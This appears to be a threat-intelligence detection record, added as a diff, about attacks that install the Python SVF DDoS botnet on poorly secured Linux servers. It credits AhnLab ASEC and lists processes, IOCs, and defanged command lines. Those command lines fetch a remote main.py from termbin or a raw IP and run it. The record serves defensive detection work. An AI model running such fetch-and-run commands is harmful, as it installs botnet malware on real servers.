@@ -1,0 +1,52 @@
+description: Attacks targeting poorly managed Linux servers to install SVF DDoS Bot
+  malware, developed in Python and using Discord as its C&C server.
+attribution:
+- SVF Team
+malware_families:
+- SVF Botnet
+TTPs:
+  processes:
+  - python
+  - wget
+  - curl
+  commandline:
+  - python -m venv venv; source ./venv/bin/activate; pip install discord discord.py
+    requests aiohttp lxml; wget hxxps://termbin[.]com/4ccx -O main.py; python main.py
+    -s 5
+  - pip install discord && pip install requests && pip install lxml && curl -sL hxxp://146.59.239[.]144:55/
+    > main.py && python main.py -s {server}
+  powershell:
+  - ''
+  scripting_engine:
+  - Python
+  registry_keys:
+  - ''
+  image_load:
+  - ''
+  network_connections:
+  - wget hxxps://termbin[.]com/4ccx
+  - curl -sL hxxp://146.59.239[.]144:55/
+  file_activity:
+  - ./venv/bin/activate
+  - main.py
+  persistence:
+  - ''
+  pipes:
+  - ''
+  process_relations:
+  - ''
+IOCs:
+  hashes:
+  - ''
+  IPs:
+  - 146.59.239[.]144:55
+  domains:
+  - termbin[.]com
+  URLs:
+  - hxxps://termbin[.]com/4ccx
+  - hxxp://146.59.239[.]144:55/
+authors:
+- AhnLab SEcurity intelligence Center (ASEC)
+reference: https://asec.ahnlab.com/en/89083/
+date_of_publication: July 18, 2025
+file_creation_date: July 24, 2025
